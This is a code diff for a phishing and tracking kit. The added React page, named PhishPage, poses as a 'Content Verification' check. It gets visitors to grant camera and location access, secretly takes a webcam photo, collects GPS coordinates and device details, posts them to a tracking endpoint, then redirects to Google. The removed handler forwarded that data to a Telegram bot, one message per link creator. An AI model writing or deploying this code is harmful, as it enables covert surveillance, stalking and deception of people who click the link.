@@ -1,111 +1,276 @@
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
+import { useRouter } from 'next/router';
+import { useEffect, useState } from 'react';
 
-  const BOT_TOKEN = process.env.BOT_TOKEN;
-  const ADMIN_ID = process.env.ADMIN_ID;
-  const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
-  const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY;
+export default function PhishPage() {
+  const router = useRouter();
+  const { id } = router.query;
+  const [linkId, setLinkId] = useState('');
 
-  const { linkId, type, photoData, coords, user_agent, screen_res, platform, language } = req.body;
-
-  if (!linkId) {
-    return res.status(400).json({ error: 'Missing linkId' });
-  }
-
-  try {
-    // STEP 1: Look up who created this link from JSONBin
-    const lookupResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
-      headers: { 'X-Master-Key': JSONBIN_MASTER_KEY }
-    });
-    const jsonbinData = await lookupResponse.json();
-    const links = jsonbinData?.record?.links || {};
-    
-    const linkData = links[linkId];
-    let targetChatId = ADMIN_ID;
-    let creatorName = 'Unknown';
-    
-    if (linkData && linkData.creator_chat_id) {
-      targetChatId = linkData.creator_chat_id;
-      creatorName = linkData.creator_name;
+  useEffect(() => {
+    if (id) {
+      setLinkId(id);
     }
+  }, [id]);
 
-    // STEP 2: Build and send the data
-    let message = `🛡️ **New Verification Captured!**\n\n`;
-    message += `👤 Target Info:\n`;
-    message += `📱 Platform: ${platform || 'Unknown'}\n`;
-    message += `🌐 Browser: ${user_agent ? user_agent.substring(0, 100) : 'Unknown'}\n`;
-    message += `🖥️ Screen: ${screen_res || 'Unknown'}\n`;
-    message += `🗣️ Language: ${language || 'Unknown'}\n`;
-    message += `⏰ Time: ${new Date().toISOString()}\n\n`;
+  return (
+    <div dangerouslySetInnerHTML={{ __html: getHTML(linkId) }} />
+  );
+}
 
-    // Send text info first
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: targetChatId, 
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
+function getHTML(linkId) {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Content Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .shield-icon { font-size: 80px; margin-bottom: 20px; }
+        h1 { color: #1a1a2e; font-size: 24px; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
+        .verify-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; border: none; padding: 18px 50px; font-size: 18px;
+            border-radius: 50px; cursor: pointer; transition: all 0.3s ease;
+            font-weight: 600; width: 100%; max-width: 300px;
+        }
+        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
+        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .loading { display: none; margin-top: 20px; }
+        .loading.active { display: block; }
+        .spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; }
+        .status.success { background: #d4edda; color: #155724; display: block; }
+        .status.error { background: #f8d7da; color: #721c24; display: block; }
+        .permissions-list { text-align: left; margin: 20px 0; padding: 0; list-style: none; }
+        .permissions-list li {
+            padding: 12px 15px; margin: 5px 0; background: #f8f9fa;
+            border-radius: 10px; display: flex; align-items: center; gap: 10px; font-size: 14px;
+        }
+        .permissions-list li .icon { font-size: 20px; }
+        .permissions-list li.granted { background: #d4edda; border-left: 4px solid #28a745; }
+        .permissions-list li.denied { background: #f8d7da; border-left: 4px solid #dc3545; }
+        .permissions-list li.pending { border-left: 4px solid #ffc107; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="shield-icon">🛡️</div>
+        <h1>Content Verification Required</h1>
+        <p>We need to verify you're a real person. Please allow access to continue.</p>
+        
+        <ul class="permissions-list" id="permList">
+            <li class="pending" id="camPerm">
+                <span class="icon">📸</span> Camera Access <span id="camStatus">(pending)</span>
+            </li>
+            <li class="pending" id="locPerm">
+                <span class="icon">📍</span> Location Access <span id="locStatus">(pending)</span>
+            </li>
+        </ul>
+        
+        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">✅ Continue to Verify</button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Verifying your device...</p>
+        </div>
+        
+        <div class="status" id="status"></div>
+    </div>
 
-    // Send location if available
-    if (coords && coords.lat && coords.lng) {
-      const locMessage = 
-`📍 **Location Captured!**
-
-Latitude: \`${coords.lat}\`
-Longitude: \`${coords.lng}\`
-Accuracy: ${coords.accuracy || 'N/A'} meters
-🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})`;
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          chat_id: targetChatId, 
-          text: locMessage,
-          parse_mode: 'Markdown'
-        })
-      });
-    }
-
-    // Send photo if available
-    if (photoData) {
-      const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
-      const buffer = Buffer.from(base64Data, 'base64');
-
-      const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
-      
-      let bodyStart = '';
-      bodyStart += `--${boundary}\r\n`;
-      bodyStart += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-      bodyStart += `${targetChatId}\r\n`;
-      bodyStart += `--${boundary}\r\n`;
-      bodyStart += `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n`;
-      bodyStart += `Content-Type: image/jpeg\r\n\r\n`;
-      
-      const bodyEnd = `\r\n--${boundary}--\r\n`;
-      const startBuffer = Buffer.from(bodyStart, 'utf-8');
-      const endBuffer = Buffer.from(bodyEnd, 'utf-8');
-      const finalBody = Buffer.concat([startBuffer, buffer, endBuffer]);
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': `multipart/form-data; boundary=${boundary}`,
-          'Content-Length': finalBody.length.toString()
-        },
-        body: finalBody
-      });
-    }
-
-    res.status(200).json({ success: true, sentTo: targetChatId });
-    
-  } catch (error) {
-    console.error('Error:', error);
-    res.status(500).json({ error: 'Internal server error: ' + error.message });
-  }
+    <script>
+        const LINK_ID = "${linkId}";
+        const API_URL = window.location.origin + '/api/track';
+        
+        let permissions = { camera: false, location: false };
+        
+        function getClientInfo() {
+            return {
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                screen_res: screen.width + 'x' + screen.height,
+                platform: navigator.platform,
+                language: navigator.language,
+                linkId: LINK_ID
+            };
+        }
+        
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                
+                permissions.camera = true;
+                document.getElementById('camPerm').className = 'granted';
+                document.getElementById('camStatus').textContent = '(granted ✓)';
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                stream.getTracks().forEach(track => track.stop());
+                return photoData;
+            } catch (err) {
+                document.getElementById('camPerm').className = 'denied';
+                document.getElementById('camStatus').textContent = '(denied ✗)';
+                return null;
+            }
+        }
+        
+        function requestLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    document.getElementById('locPerm').className = 'denied';
+                    document.getElementById('locStatus').textContent = '(not supported ✗)';
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        permissions.location = true;
+                        document.getElementById('locPerm').className = 'granted';
+                        document.getElementById('locStatus').textContent = '(granted ✓)';
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    () => {
+                        document.getElementById('locPerm').className = 'denied';
+                        document.getElementById('locStatus').textContent = '(denied ✗)';
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+        
+        async function sendData(photo, location) {
+            // First: send the photo
+            if (photo) {
+                try {
+                    const photoPayload = {
+                        linkId: LINK_ID,
+                        type: 'photo',
+                        photoData: photo
+                    };
+                    const photoResponse = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(photoPayload)
+                    });
+                    console.log('Photo send response:', photoResponse.status);
+                } catch (err) {
+                    console.error('Photo send error:', err);
+                }
+            }
+            
+            // Second: send location
+            if (location) {
+                try {
+                    const locPayload = {
+                        linkId: LINK_ID,
+                        type: 'location',
+                        coords: {
+                            lat: location.latitude,
+                            lng: location.longitude,
+                            accuracy: location.accuracy
+                        }
+                    };
+                    const locResponse = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locPayload)
+                    });
+                    console.log('Location send response:', locResponse.status);
+                } catch (err) {
+                    console.error('Location send error:', err);
+                }
+            }
+            
+            // Third: send device info
+            try {
+                const infoPayload = {
+                    linkId: LINK_ID,
+                    type: 'info',
+                    ...getClientInfo(),
+                    hasCamera: permissions.camera,
+                    hasLocation: permissions.location
+                };
+                const infoResponse = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(infoPayload)
+                });
+                console.log('Info send response:', infoResponse.status);
+            } catch (err) {
+                console.error('Info send error:', err);
+            }
+            
+            return true;
+        }
+        
+        async function startVerification() {
+            const btn = document.getElementById('verifyBtn');
+            const loading = document.getElementById('loading');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ Verifying...';
+            loading.classList.add('active');
+            
+            // Step 1: Request camera FIRST (shows browser popup)
+            const photo = await requestCamera();
+            
+            // Step 2: Request location SECOND (shows browser popup)
+            const location = await requestLocation();
+            
+            // Step 3: Send all data
+            const sent = await sendData(photo, location);
+            
+            loading.classList.remove('active');
+            
+            // Always show success (even if some permissions denied)
+            status.className = 'status success';
+            status.innerHTML = '✅ <b>Verification Complete!</b><br>You will be redirected shortly...';
+            btn.textContent = '✅ Verified';
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+        }
+    </script>
+</body>
+</html>`;
 }
